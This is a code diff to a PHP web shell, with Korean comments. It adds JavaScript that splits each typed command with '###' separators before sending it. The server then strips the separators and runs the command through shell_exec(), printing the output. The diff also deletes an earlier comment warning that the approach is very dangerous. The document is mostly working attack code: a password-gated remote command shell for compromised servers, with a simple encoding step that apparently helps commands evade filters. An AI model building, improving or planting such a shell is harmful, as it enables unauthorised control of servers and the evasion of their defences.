@@ -31,19 +31,48 @@ if(empty($_SESSION["webshell_id"]) && empty($input_password)) {
     }
 }
 ?>
+<script>
+    // 엔터 키(keyCode:13) 누르면 명령어 실행하게 해주는 이벤트 리스너야.
+    // 이렇게 하면 사용자가 입력 필드에서 엔터 키를 누를 때마다 명령어가 자동으로 실행돼.
+    // 편의성을 위해 추가
+    document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}});
 
-<form action="<?=$page?>" method="POST">
-    <!-- 셸 명령어를 입력받는 텍스트 입력 필드 -->
+    function cmdRequest() {
+        var frm = document.frm; //frm'이라는 이름의 폼을 찾아서 변수에 저장해.
+        var cmd = frm.cmd.value; //사용자가 입력한 'name="cmd"'인 입력 필드의 값을 가져온다.
+        var enc_cmd = "";
+
+        // 명령어를 문자 단위로 쪼개서 "###"을 사이에 넣어.
+        // 이거 서버에서 다시 원래대로 만들 거야.
+        for(i=0; i<cmd.length; i++) {
+            enc_cmd += cmd.charAt(i) + "###";
+        }
+        // 인코딩된 명령어를 폼의 cmd 필드에 다시 설정해.
+        // 이렇게 하면 서버로 전송될 때 인코딩된 형태로 가게 돼.
+        frm.cmd.value = enc_cmd;
+
+        // 폼의 action 속성을 현재 페이지 URL로 설정만 하고, frm.submit()으로 보낸다.
+        // 새로운 명령어 실행: 매번 폼을 제출할 때마다 새로운 cmd 값을 서버로 보내. 이전 명령어는 유지되지 않아
+        frm.action = "<?=$page?>";
+        // 폼을 제출해서 서버로 명령어를 보내.
+        frm.submit();
+    }
+</script>
+
+
+<form name="frm" method="POST">
     <input type="text" name="cmd">
-    <!-- 명령어 실행 버튼 -->
-    <input type="submit" value="EXECUTE">
+    <input type="button" onClick="cmdRequest();" value="EXECUTE">
 </form>
+
+
 <?php
 if (isset($_POST["cmd"])) { // 'cmd' 키가 $_POST 배열에 존재하는지 확인
     $cmd = $_POST["cmd"];
     if (!empty($cmd)) { //// 'cmd' 값이 존재하는지 확인
         // shell_exec()를 통해 사용자 입력 명령어를 실행
-        // 주의: 이 방식은 보안상 매우 위험할 수 있음
+        // "###" 제거하고 원래 명령어로 복원
+        $cmd = str_replace("###","",$cmd);
         $result = shell_exec($cmd);
         // 명령어 실행 결과의 개행 문자를 HTML 줄바꿈 태그로 변환
         $result = str_replace("\n", "<br>", $result);
